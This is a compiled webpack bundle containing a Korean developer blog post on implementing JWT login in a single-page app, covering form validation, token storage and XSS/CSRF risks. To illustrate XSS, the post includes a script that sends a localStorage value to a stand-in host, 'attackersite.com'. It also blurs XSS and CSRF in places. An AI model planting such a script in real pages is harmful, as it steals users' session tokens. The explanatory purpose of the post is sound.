(window.webpackJsonp=window.webpackJsonp||[]).push([[331],{876:function(t,s,a){"use strict";a.r(s);var r=a(6),e=Object(r.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"들어가며"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#들어가며"}},[t._v("#")]),t._v(" 들어가며")]),t._v(" "),s("p",[t._v("약 2주간의 고민과 현직자분의 조언, 많은 사람들의 추천을 받은 글 등을 찾아보며 로그인 기능을 구현해보았습니다. 어려움이 많았지만 기능 구현에 성공했기에 의미없는 삽질이 결코 아니었습니다.")]),t._v(" "),s("p",[t._v("로그인 기능을 구현해보며 들었던 생각은 사용자 인증이라는 부분이 개발자가 어떻게 마음먹냐에 따라 구현 난이도가 천차만별이라는 것이었습니다.")]),t._v(" "),s("p",[t._v("국내외 할 것 없이 수십개의 아티클들을 뒤져보았고 발생할 수 있는 시나리오에 대해 많은 생각을 해보았던 것 같습니다. 그 과정에서 부족했던 HTTP 네트워크 기반 지식도 더 학습해볼 수 있었고, 이론만으로 배웠던 부분들을 실제로 적용해보기도 했습니다.")]),t._v(" "),s("p",[t._v("여러 배움이 있었지만 가장 큰 도움이 되었던 부분은 바로 "),s("strong",[t._v("SPA에 대한 이해라는 것입니다.")]),t._v(" 로그인 기능 구현을 JWT 방식을 기반으로 진행하였는데, SPA 어플리케이션에서 토큰을 어떻게 관리해야할지에 대한 고민이 저에게 큰 성장거리를 주었던 것 같습니다.")]),t._v(" "),s("p",[t._v("앞으로 작성할 글은 조금은 긴 호흡으로 작성될 예정입니다. 저의 이해를 모두 풀어서 작성할 것이며, 추후 로그인 기능을 다시 구현하게 될 때에 저 또한 복습을 위해 참고해볼 예정입니다 😃")]),t._v(" "),s("p",[t._v("글은 다음과 같은 순서로 진행됩니다.")]),t._v(" "),s("ol",[s("li",[t._v("프론트엔드에서의 사용자인증 시나리오")]),t._v(" "),s("li",[t._v("JWT 이해하기")]),t._v(" "),s("li",[t._v("SPA와 전역상태에 대한 이야기")]),t._v(" "),s("li",[t._v("백엔드(장고)와의 협업 이야기")]),t._v(" "),s("li",[t._v("etc..")])]),t._v(" "),s("h2",{attrs:{id:"프론트엔드에서의-사용자인증-시나리오"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#프론트엔드에서의-사용자인증-시나리오"}},[t._v("#")]),t._v(" 프론트엔드에서의 사용자인증 시나리오")]),t._v(" "),s("p",[t._v("JWT기반의 사용자 인증은 서버에서 발급해주는 토큰을 기반으로 이루어집니다.")]),t._v(" "),s("p",[t._v("토큰은 액세스 토큰, 리프레시 토큰 둘로 이루어지며 개인정보 접근을 위한 열쇠의 역할을 액세스토큰이 하게 됩니다.")]),t._v(" "),s("p",[t._v("액세스토큰은 휘발성이며 세션방식의 인증과 반대로 DB에 쌓이지 않습니다. 만료기간이 토큰 내에 설정되어 있고 서버에 요청을 보낼 때에 이를 가지고 접근 허용 여부를 판단하게 됩니다.")]),t._v(" "),s("p",[t._v("토큰은 JSON형식의 정보가 해시값으로 계산되어 반환되고 "),s("code",[t._v("exp")]),t._v("과 같은 값들이 만료기간을 나타냅니다. 여러가지 정보들을 포함하여 내보낼 수도 있지만 JWT방식으로 토큰을 주고받을 때에는 예민한 개인 정보들을 포함하지 않습니다.")]),t._v(" "),s("p",[t._v("토큰 인증과 관련된 부분에 있어서 프론트엔드에서"),s("strong",[t._v("만")]),t._v(" 할 수 있는 부분과 백엔드에서"),s("strong",[t._v("만")]),t._v(" 할 수 있는 것들을 구분해야합니다.")]),t._v(" "),s("h3",{attrs:{id:"프론트엔드가-할일-유효성-검사"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#프론트엔드가-할일-유효성-검사"}},[t._v("#")]),t._v(" 프론트엔드가 할일 - 유효성 검사")]),t._v(" "),s("p",[t._v("로그인을 예로 들어 아이디와 비밀번호를 입력받은 뒤 POST요청을 보냅니다. 이때 "),s("code",[t._v("react-hook-form")]),t._v("과 같은 라이브러리를 활용하면 프론트엔드 자체에서 불필요한 서버로의 요청 수를 줄일 수 있습니다.")]),t._v(" "),s("p",[t._v("비밀번호 입력에 대해 8자 이상, 영문과 특수문자 혼합이라는 규칙이 결정되어 있다면 이는 프론트엔드에서도 정규식을 통해 충분히 유효성 검사를 처리할 수 있는 부분입니다.")]),t._v(" "),s("p",[t._v("데이터 입력과 동시에 "),s("strong",[t._v("이미 유효하지 않은 데이터임을 알고 있는데도 요청을 보내는 것은 분명 불필요한 네트워크 통신입니다.")]),t._v(" 이러한 요청들을 보내기에 앞서 프론트엔드 측에서 요청 자체를 막아버리면 더 바람직할것입니다.")]),t._v(" "),s("div",{staticClass:"language-javascript extra-class"},[s("pre",{pre:!0,attrs:{class:"language-javascript"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("input\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("...")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("register")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'loginPassword'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("required")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'😭 비밀번호를 입력해주세요!'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("minLength")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("message")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'😭 비밀번호를 8자 이상 입력해주세요!'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    placeholder"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'비밀번호 입력'")]),t._v("\n    type"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'password'")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),s("p",[t._v("위와같이 input태그 기본 어트리뷰트인 "),s("code",[t._v("minLength")]),t._v("나 "),s("code",[t._v("required")]),t._v("등에 대한 규칙을 심어놓고 "),s("code",[t._v("react-hook-form")]),t._v("을 사용하면 에러처리가 용이하며 백엔드로의 요청도 "),s("code",[t._v("preventDefault")]),t._v("함수 호출로 막을 수 있습니다.")]),t._v(" "),s("p",[t._v("입력 형식과 같은 유효성 검사를 처리하였으면 이후로는 "),s("strong",[t._v("에러처리가 중요합니다.")]),t._v(" 프론트엔드 개발자는 사용자에게 서비스가 어떻게 돌아가고 있는지에 대한 피드백을 적극적으로 제공해야합니다.")]),t._v(" "),s("p",[t._v("로그인에 대한 상황만 가정하더라도 고려해야할 피드백이 다음과 같습니다.")]),t._v(" "),s("ol",[s("li",[t._v("아이디 존재여부")]),t._v(" "),s("li",[t._v("아이디는 존재하는데 비밀번호가 틀림")]),t._v(" "),s("li",[t._v("각종 서버 에러 (500처리 등)")])]),t._v(" "),s("p",[t._v("요청이 정상적으로 이루어지고 있는 지 확인하려면 로딩 인디케이터 삽입과 같은 것들도 필요하게 됩니다.")]),t._v(" "),s("p",[t._v("백엔드 개발자와 사전에 협의하여 반환을 원하는 에러코드 및 메세지들을 논의하고, "),s("code",[t._v("axios")]),t._v("요청의 catch를 통해 사용자에게 어떤 에러가 발생했는지 알려주어야 합니다.")]),t._v(" "),s("p",[t._v("토큰 저장 및 관리에 대한 이야기는 SPA이야기와 함께 진행하도록 하겠습니다.")]),t._v(" "),s("h2",{attrs:{id:"jwt-인증-시나리오"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#jwt-인증-시나리오"}},[t._v("#")]),t._v(" JWT 인증 시나리오")]),t._v(" "),s("p",[t._v("토큰을 어떻게 다뤄야할지 알기 위해서는 JWT를 왜 사용해야 하는 지에 대해 먼저 이해해야합니다.")]),t._v(" "),s("p",[t._v("세션 기반의 인증은 로그인 성공 후 서버측에서 이를 인증하는 정보를 발급하여 저장하고 클라이언트 측에 발급합니다.")]),t._v(" "),s("p",[t._v("로그인 인증정보를 서버 자체에 저장한다는 점에 주목해야합니다. 유저 수가 늘어나고 서버 규모가 커짐에 따라 관리해야할 세션정보가 늘어나며, 서버를 여러대 두고 서비스를 제공할 때에 로드밸런싱으로 사용자를 분배해야하는데 이때 HTTP 무상태성이라는 특징으로 인해 매번 새로 로그인을 해야하게 됩니다. "),s("a",{attrs:{href:"https://fierycoding.tistory.com/m/69",target:"_blank",rel:"noopener noreferrer"}},[t._v("다음 링크를 참조해주세요."),s("OutboundLink")],1)]),t._v(" "),s("p",[t._v("이에 반해 JWT방식은 인증정보 저장에 대한 책임을 클라이언트로 넘긴 것이라고 보면 됩니다. 서버는 "),s("strong",[t._v("발급과 검증만 합니다.")])]),t._v(" "),s("p",[t._v("인증정보의 책임이 클라이언트로 넘어가게 됨으로써 발생할 수 있는 문제는 결국 "),s("strong",[t._v("탈취에 대한 문제입니다.")]),t._v(" 브라우저에 자바스크립트를 통해 접근하여 토큰 탈취 후 마음대로 사용자 인증을 처리하면 모든 정보가 노출되는 것입니다.")]),t._v(" "),s("p",[t._v("우선 클라이언트측에 서버로부터 발급받은 액세스토큰과 리프레시토큰을 저장하는 방법은 다음과 같습니다.")]),t._v(" "),s("ol",[s("li",[t._v("브라우저 자체 localStorage / sessionStorage에 저장")]),t._v(" "),s("li",[t._v("쿠키 및 브라우저 메모리에 저장")])]),t._v(" "),s("p",[t._v("브라우저 스토리지에 저장하게 되면 XSS공격에 노출되기 쉽습니다. 아래 예시 코드를 서버에 요청하게 되면 XSS 공격자 브라우저에 토큰이 노출됩니다.")]),t._v(" "),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token script"}},[s("span",{pre:!0,attrs:{class:"token language-javascript"}},[t._v("\n    document"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<img src=\'http://attackersite.com?cookie="')]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n            localStorage"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getItem")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'foo'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\'>"')]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("세션스토리지는 탭을 닫으면 스토리지에 저장된 데이터들이 사라진다 뿐이지 로컬스토리지와 동작 방식과 메서드도 동일합니다. 동일하게 XSS공격에 노출됩니다.")]),t._v(" "),s("p",[t._v("쿠키의 경우에는 CSRF공격에 대해 취약점이 존재합니다. "),s("code",[t._v("document.cookie")]),t._v("를 통해 쿠키에 저장된 값들에 자바스크립트로 접근할 수 있기 때문에 토큰값을 탈취당할 위험성이 존재합니다. 크로스-사이트간 취약점이 존재하는 것입니다.")]),t._v(" "),s("p",[t._v("이에 대한 해결책으로 httpOnly속성을 쿠키에 추가하여 서버와 쿠키를 주고받게 되면 브라우저 자바스크립트로 쿠키에 접근할 수 없게 됩니다.")]),t._v(" "),s("p",[t._v("아무리 쿠키를 통한 인증방식을 택하더라도 쿠키 자체에 액세스토큰을 노출시키는 것은 안전하지 않습니다. 따라서 "),s("strong",[t._v("쿠키에는 리프레시 토큰만 저장하고 액세스토큰은 브라우저 메모리 상에 저장합니다.")])]),t._v(" "),s("h2",{attrs:{id:"reference"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#reference"}},[t._v("#")]),t._v(" Reference")]),t._v(" "),s("ol",[s("li",[s("a",{attrs:{href:"https://fierycoding.tistory.com/m/69",target:"_blank",rel:"noopener noreferrer"}},[t._v("세션과 토큰의 차이점"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://stackoverflow.com/questions/32060478/is-a-refresh-token-really-necessary-when-using-jwt-token-authentication",target:"_blank",rel:"noopener noreferrer"}},[t._v("Is a Refresh Token really necessary when using JWT token authentication? - stackoverflow"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://velog.io/@yaytomato/%ED%94%84%EB%A1%A0%ED%8A%B8%EC%97%90%EC%84%9C-%EC%95%88%EC%A0%84%ED%95%98%EA%B2%8C-%EB%A1%9C%EA%B7%B8%EC%9D%B8-%EC%B2%98%EB%A6%AC%ED%95%98%EA%B8%B0",target:"_blank",rel:"noopener noreferrer"}},[t._v("Velog - 프론트엔드에서 로그인 안전하게 처리하기"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://lucete1230-cyberpolice.tistory.com/23",target:"_blank",rel:"noopener noreferrer"}},[t._v("XSS와 CSRF의 차이"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"http://michael-coates.blogspot.com/2010/07/html5-local-storage-and-xss.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("A Journey in Security"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://stackoverflow.com/questions/35291573/csrf-protection-with-json-web-tokens",target:"_blank",rel:"noopener noreferrer"}},[t._v("CSRF protection with JSON web tokens"),s("OutboundLink")],1)])])])}),[],!1,null,null,null);s.default=e.exports}}]);